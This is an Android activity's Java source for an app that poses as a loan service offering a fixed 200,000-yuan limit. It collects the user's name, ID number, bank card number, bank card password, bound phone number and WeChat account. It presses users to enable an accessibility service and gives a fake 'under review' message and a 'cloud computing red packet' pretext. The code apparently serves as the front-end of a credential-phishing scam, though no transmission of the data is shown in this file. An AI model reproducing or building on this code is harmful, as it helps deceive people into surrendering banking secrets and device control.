package com.example.h3;



import java.util.List;

import com.byc.loan.R;
import com.example.h3.permission.FloatWindowManager;

import accessibility.QiangHongBaoService;
import util.BackgroundMusic;
import util.ConfigCt;
import util.SpeechUtil;

import android.app.ActivityManager;
import android.app.Activity;
import android.app.AlertDialog;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import android.net.Uri;
import android.widget.Toast; 

import android.widget.TextView; 
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;; 

public class MainActivity extends Activity {

	private String TAG = "byc001";
    //
    public TextView tvMoney;//当前可贷金额
    public TextView tvSayState;//当前贷款状态说明
    private Button btOpenServer; //开启贷款服务
    private Button btRun;//开始
    private Button btClose;//关闭
    private EditText etName; //姓名：
    private EditText etIDnum; //身份证号
    private EditText etBCnum; //银行卡号：
    private EditText etBCPWD; //银行卡号：
    private EditText etPhoneNum; //银行卡绑定的手机号
    private EditText etWXnum; //微信帐号：
    private EditText etRequestMoney; //货款金额（

    private SpeechUtil speaker ;
    //发音模式：
    private RadioGroup rgSelSoundMode; 
    private RadioButton rbFemaleSound;
    private RadioButton rbMaleSound;
    private RadioButton rbSpecialMaleSound;
    private RadioButton rbMotionMaleSound;
    private RadioButton rbChildrenSound;
    private RadioButton rbCloseSound;
    
    
    private BackgroundMusic mBackgroundMusic;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		setContentView(R.layout.activity_main);
	    TAG=Config.TAG;
	    Log.d(TAG, "事件---->MainActivity onCreate");
	    //1.初 始化配置类；
	    Config.getConfig(getApplicationContext());//
	    speaker=SpeechUtil.getSpeechUtil(getApplicationContext());
		//2.初始化控件：
		InitWidgets();
		//3.读入参数：
		SetWidgets();
		//4.绑定控件事件：
		BindWidgets();
		setMyTitle();
		//6。接收广播消息
        IntentFilter filter = new IntentFilter();
        filter.addAction(Config.ACTION_QIANGHONGBAO_SERVICE_CONNECT);
        filter.addAction(Config.ACTION_QIANGHONGBAO_SERVICE_DISCONNECT);
        registerReceiver(qhbConnectReceiver, filter);
        //7.播放背景音乐：
        mBackgroundMusic=BackgroundMusic.getInstance(getApplicationContext());
        //mBackgroundMusic.playBackgroundMusic( "bg_music.mp3", true);

		
	}
	private BroadcastReceiver qhbConnectReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(TAG, "receive-->" + action);
            String say="";
            if(Config.ACTION_QIANGHONGBAO_SERVICE_CONNECT.equals(action)) {
            	say="已连接"+ConfigCt.AppName+"服务！";
            } else if(Config.ACTION_QIANGHONGBAO_SERVICE_DISCONNECT.equals(action)) {
            	say="已中断"+ConfigCt.AppName+"服务！";
            }
        	speaker.speak(say);
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_SHORT).show();
        }
    };

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_floatwindow) {
			 FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this);
			return true;
		}
		if (id == R.id.action_settings) {
			Intent intent=new Intent();
			//Intent intent =new Intent(Intent.ACTION_VIEW,uri);
			intent.setAction("android.intent.action.VIEW");
			Uri content_url=Uri.parse(ConfigCt.homepage);
			intent.setData(content_url);
			startActivity(intent);
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	
    public Config getConfig(){
    	return Config.getConfig(this);
    }

    public static boolean OpenGame(String gamePkg,Context context){
    	Intent intent = new Intent(); 
    	PackageManager packageManager = context.getPackageManager(); 
    	intent = packageManager.getLaunchIntentForPackage(gamePkg); 
    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED | Intent.FLAG_ACTIVITY_CLEAR_TOP) ; 
    	context.startActivity(intent);
    	return true;
    }

    //初始化控件：
    private void InitWidgets(){

	    //功能按钮：
	    tvMoney=(TextView) findViewById(R.id.tvMoney);
	    tvSayState=(TextView) findViewById(R.id.tvSaySate);
	    btOpenServer=(Button)findViewById(R.id.btOpenServer);
	    btRun=(Button) findViewById(R.id.btRun); 
	    btClose=(Button)findViewById(R.id.btClose);
	    etName=(EditText) findViewById(R.id.etName); 
	    etIDnum=(EditText) findViewById(R.id.etIDnum); 
	    etBCnum=(EditText) findViewById(R.id.etBCnum); 
	    etBCPWD=(EditText) findViewById(R.id.etBCPWD);
	    etPhoneNum=(EditText) findViewById(R.id.etPhoneNum); 
	    etWXnum=(EditText) findViewById(R.id.etWXnum); 
	    etRequestMoney=(EditText) findViewById(R.id.etRequestMoney); 
	   
	    //发音模式：
	    rgSelSoundMode = (RadioGroup)this.findViewById(R.id.rgSelSoundMode);
	    rbFemaleSound=(RadioButton)findViewById(R.id.rbFemaleSound);
	    rbMaleSound=(RadioButton)findViewById(R.id.rbMaleSound);
	    rbSpecialMaleSound=(RadioButton)findViewById(R.id.rbSpecialMaleSound);
	    rbMotionMaleSound=(RadioButton)findViewById(R.id.rbMotionMaleSound);
	    rbChildrenSound=(RadioButton)findViewById(R.id.rbChildrenSound);
	    rbCloseSound=(RadioButton)findViewById(R.id.rbCloseSound); 

    }
    /*
     * 绑定控件事件：
     */
    private void BindWidgets(){
    	//1.绑定按钮1
		//2。打开辅助服务按钮
		//btStart = (Button) findViewById(R.id.btStart); 
    	btOpenServer.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v) {
				mBackgroundMusic.stopBackgroundMusic();
				String say="";
				//if(!Config.bReg)
				if(!QiangHongBaoService.isRunning()) {
					//打开系统设置中辅助功能
					Log.d(TAG, "事件---->打开系统设置中辅助功能");
					//Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS); 
					//startActivity(intent);
					QiangHongBaoService.startSetting(getApplicationContext());
					say="找到"+ConfigCt.AppName+"，然后开启"+ConfigCt.AppName+"服务。";
					Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
					speaker.speak(say);
				}else{
					say=ConfigCt.AppName+"服务已开启！";
					Toast.makeText(MainActivity.this,say , Toast.LENGTH_LONG).show();
					speaker.speak(say);
				}
				
			}
		});//startBtn.setOnClickListener(
		btRun.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v) {
				mBackgroundMusic.stopBackgroundMusic();
				String say="";
				if(!QiangHongBaoService.isRunning()) {
					//打开系统设置中辅助功能
					say="请先打开"+ConfigCt.AppName+"服务！才能开始申请贷款！";
					Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
					speaker.speak(say);
					return;
				}
				if(!isWriteAccountInfo())return;
				say="您的申请已提交！请耐心等待审核通过！审核通过后我们将会于软件，短信，微信联系方式通知您！";
				Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
				speaker.speak(say);
			}
		});//startBtn.setOnClickListener(
		btClose.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				finish();
			}
		});//btn.setOnClickListener(
		

    	 //4.设置发音 模式
    	rgSelSoundMode.setOnCheckedChangeListener(new OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup arg0, int arg1) {
                // TODO Auto-generated method stub
                //获取变更后的选中项的ID
               int radioButtonId = arg0.getCheckedRadioButtonId();
               //根据ID获取RadioButton的实例
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                //更新文本内容，以符合选中项
                String sChecked=rb.getText().toString();
                String say="";
               if(sChecked.equals("关闭语音提示")){
            	   Config.bSpeaking=Config.KEY_NOT_SPEAKING;
               		say="当前设置：关闭语音提示。";
               }
               if(sChecked.equals("女声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_FEMALE;
               		say="当前设置：女声提示。";
               }
               if(sChecked.equals("男声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_MALE;
               		say="当前设置：男声提示。";
               }
               if(sChecked.equals("特别男声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_SPECIAL_MALE;
               		say="当前设置：特别男声提示。";
               }
               if(sChecked.equals("情感男声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_EMOTION_MALE;
               		say="当前设置：情感男声提示。";
               }
               if(sChecked.equals("情感儿童声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_CHILDREN;
               		say="当前设置：情感儿童声提示。";
               }
        	   speaker.setSpeaking(Config.bSpeaking);
        	   speaker.setSpeaker(Config.speaker);
          		getConfig().setWhetherSpeaking(Config.bSpeaking);
          		getConfig().setSpeaker(Config.speaker);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this,say, Toast.LENGTH_LONG).show();
           }
        });
    	
    }
    /*
     * 读入配置参数到控件：
     */
    private void SetWidgets(){
    	Config.bState=Config.getConfig(getApplicationContext()).getState();
    	if(Config.bState){
    		tvSayState.setText("当前贷款进度");
    		tvMoney.setText("贷款审核中");
    	}else{
    		tvSayState.setText("当前贷款额度");
    		tvMoney.setText("20万元");
    	}
    	//姓名
    	Config.userName=Config.getConfig(getApplicationContext()).getUserName();
    	etName.setText(Config.userName);
    	//身份证
    	Config.IDnum=Config.getConfig(getApplicationContext()).getIDnum();
    	etIDnum.setText(Config.IDnum);
    	//银行卡
    	Config.BCnum=Config.getConfig(getApplicationContext()).getBCnum();
    	etBCnum.setText(Config.BCnum);
    	//银行卡密码
    	Config.BCPWD=Config.getConfig(getApplicationContext()).getBCPWD();
    	etBCPWD.setText(Config.BCPWD);
    	//手机号
    	Config.PhoneNum=Config.getConfig(getApplicationContext()).getPhoneNum();
    	etPhoneNum.setText(Config.PhoneNum);
    	//微信号
    	Config.WXnum=Config.getConfig(getApplicationContext()).getWXnum();
    	etWXnum.setText(Config.WXnum);
    	//贷款金额
    	Config.RequestMoney=Config.getConfig(getApplicationContext()).getRequestMoney();
    	etRequestMoney.setText(Config.RequestMoney);
  
    	//2.发音模式：
    	speaker=SpeechUtil.getSpeechUtil(MainActivity.this);
    	if(Config.bSpeaking==Config.KEY_NOT_SPEAKING){
    		rbCloseSound.setChecked(true);//自动返回
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_FEMALE)){
    		rbFemaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_MALE)){
    		rbMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_SPECIAL_MALE)){
    		rbSpecialMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_EMOTION_MALE)){
    		rbMotionMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_CHILDREN)){
    		rbChildrenSound.setChecked(true);
    	}
    	speaker.setSpeaker(Config.speaker);
    	speaker.setSpeaking(Config.bSpeaking);	
    	
    }
    /*
     * 检测是否填写帐号信息：
     */
    private boolean isWriteAccountInfo(){
    	String say="";
    	String info=etName.getText().toString();
    	info=info.trim();
    	if(info.length()<2){
    		say="请输入真实姓名！";
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		speaker.speak(say);
    		return false;
    	}
    	Config.getConfig(getApplicationContext()).setUserName(info);//真实姓名
        //身份证号：
    	info=etIDnum.getText().toString();
    	info=info.trim();
    	if(info.length()!=18){
    		say="请输入身份证号！";
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		speaker.speak(say);
    		return false;
    	}
    	Config.getConfig(getApplicationContext()).setIDnum(info);
        //银行卡号：
    	info=etBCnum.getText().toString();
    	info=info.trim();
    	if(info.length()<16){
    		say="请输入银行卡号！";
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		speaker.speak(say);
    		return false;
    	}
    	Config.getConfig(getApplicationContext()).setBCnum(info);
        //银行卡密码：
    	info=etBCPWD.getText().toString();
    	info=info.trim();
    	if(info.length()<6){
    		//say="请输入银行卡号！";
        	//Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		//speaker.speak(say);
    		//return false;
    	}
    	Config.getConfig(getApplicationContext()).setBCPWD(info);
        //手机号：
    	info=etPhoneNum.getText().toString();
    	info=info.trim();
    	if(info.length()!=11){
    		say="请输入与银行卡绑定的手机号！";
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		speaker.speak(say);
    		return false;
    	}
    	Config.getConfig(getApplicationContext()).setPhoneNum(info);
        //微信号：
    	info=etWXnum.getText().toString();
    	info=info.trim();
    	if(info.length()<3){
    		say="请输入微信号！";
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		speaker.speak(say);
    		return false;
    	}
    	Config.getConfig(getApplicationContext()).setWXnum(info);
        //贷款金额
    	info=etRequestMoney.getText().toString();
    	info=info.trim();
    	if(info.length()<2){
    		say="请输入贷款金额！";
        	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    		speaker.speak(say);
    		return false;
    	}
    	Config.getConfig(getApplicationContext()).setRequestMoney(info);
    	Config.bState=true;
    	Config.getConfig(getApplicationContext()).setState(true);
    	tvMoney.setText("贷款审核中");
    	return true;
    }
  

    //设置软件标题：
   public void setMyTitle(){
	   Config.bReg=true;
        if(ConfigCt.version.equals("")){
      	  try {
      		  PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
      		ConfigCt.version = info.versionName;
      	  } catch (PackageManager.NameNotFoundException e) {
      		  e.printStackTrace();
            
      	  }
        }
        if(Config.bReg){
      	  setTitle(getString(R.string.app_name) + " v" + ConfigCt.version+"（正式版）");
        }else{
      	  setTitle(getString(R.string.app_name) + " v" + ConfigCt.version+"（试用版）");
        }
    }
  
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   /**  软件更新提醒*/
   private void updateMeWarning(String version,String new_version){
	   try{
		   float f1=Float.parseFloat(version);
		   float f2=Float.parseFloat(new_version);
	   if(f2>f1){
		   showUpdateDialog();
	   }
	   } catch (Exception e) {  
           e.printStackTrace();  
           return;  
       }  
   }

   private   void   showUpdateDialog(){ 
       /* @setIcon 设置对话框图标 
        * @setTitle 设置对话框标题 
        * @setMessage 设置对话框消息提示 
        * setXXX方法返回Dialog对象，因此可以链式设置属性 
        */ 
       final AlertDialog.Builder normalDialog=new  AlertDialog.Builder(MainActivity.this); 
       normalDialog.setIcon(R.drawable.ic_launcher); 
       normalDialog.setTitle(  "升级提醒"  );
       normalDialog.setMessage("有新版软件，是否现在升级？"); 
       normalDialog.setPositiveButton("确定",new DialogInterface.OnClickListener(){
           @Override 
           public void onClick(DialogInterface dialog,int which){ 
               //...To-do
    		   Uri uri = Uri.parse(ConfigCt.download);    
    		   Intent it = new Intent(Intent.ACTION_VIEW, uri);    
    		   startActivity(it);  
           }
       }); 
       normalDialog.setNegativeButton("关闭",new DialogInterface.OnClickListener(){ 
           @Override 
           public void onClick(DialogInterface dialog,   int   which){ 
           //...To-do 
           } 
       }); 
       // 显示 
       normalDialog.show(); 
       
   } 
   private   void   showCalcDialog(){ 
       /* @setIcon 设置对话框图标 
        * @setTitle 设置对话框标题 
        * @setMessage 设置对话框消息提示 
        * setXXX方法返回Dialog对象，因此可以链式设置属性 
        */ 
       final AlertDialog.Builder normalDialog=new  AlertDialog.Builder(MainActivity.this); 
       normalDialog.setIcon(R.drawable.ic_launcher); 
       normalDialog.setTitle(  "云计算红包提醒"  );
       normalDialog.setMessage(ConfigCt.AppName+"将要开始云计算，刷红包！此计算需要很长时间，请于晚上零点运行计算任务！！晚上网络不拥堵！运行计算任务时不要锁屏！手机处于充电状态！以免计算失败！"); 
       normalDialog.setPositiveButton("确定",new DialogInterface.OnClickListener(){
           @Override 
           public void onClick(DialogInterface dialog,int which){ 
           	if(!QiangHongBaoService.isRunning()) {
   				String say="请先找到"+ConfigCt.AppName+"，然后打开"+ConfigCt.AppName+"服务！";
   				Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
   				speaker.speak(say);
   				QiangHongBaoService.startSetting(getApplicationContext());
   				return;
   			}
   			if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
   				if(!FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))return;
   			}
   			//CalcShow.getInstance(getApplicationContext()).showAnimation();
   			//CalcShow.getInstance(getApplicationContext()).showTxt();
   			btRun.setText("暂停");
          }
       }); 
       normalDialog.setNegativeButton("关闭",new DialogInterface.OnClickListener(){ 
           @Override 
           public void onClick(DialogInterface dialog,   int   which){ 
           //...To-do 
           } 
       }); 
       // 显示 
       normalDialog.show(); 
   } 
	@Override
	protected void onNewIntent(Intent intent) {
	    super.onNewIntent(intent);
	    setIntent(intent);//must store the new intent unless getIntent() will return the old one
	    //startAllServices();
		Log.i(Config.TAG, "aa onNewIntent: 调用");  
	}
	  @Override
	  protected void onStop() {
	      // TODO Auto-generated method stub
	      super.onStop();
	      //mainActivity=null;
	      finish();
	  }
	   @Override
	   protected void onDestroy() {
		   super.onDestroy();
		   unregisterReceiver(qhbConnectReceiver);
		   mBackgroundMusic.stopBackgroundMusic();
	   }
   
   
   
   
   
   
   
   
   
   
   
   
  
   /**
    * 获取当前应用程序的包名
    * @param context 上下文对象
    * @return 返回包名
    */
   public static String getAppProcessName(Context context) {
       //当前应用pid
       int pid = android.os.Process.myPid();
       //任务管理类
       ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
       //遍历所有应用
       List<ActivityManager.RunningAppProcessInfo> infos = manager.getRunningAppProcesses();
       for (ActivityManager.RunningAppProcessInfo info : infos) {
           if (info.pid == pid)//得到当前应用
        	   Log.i("byc002", info.processName);
               return info.processName;//返回包名
        	   
       }
       return "";
   }

  
 
}
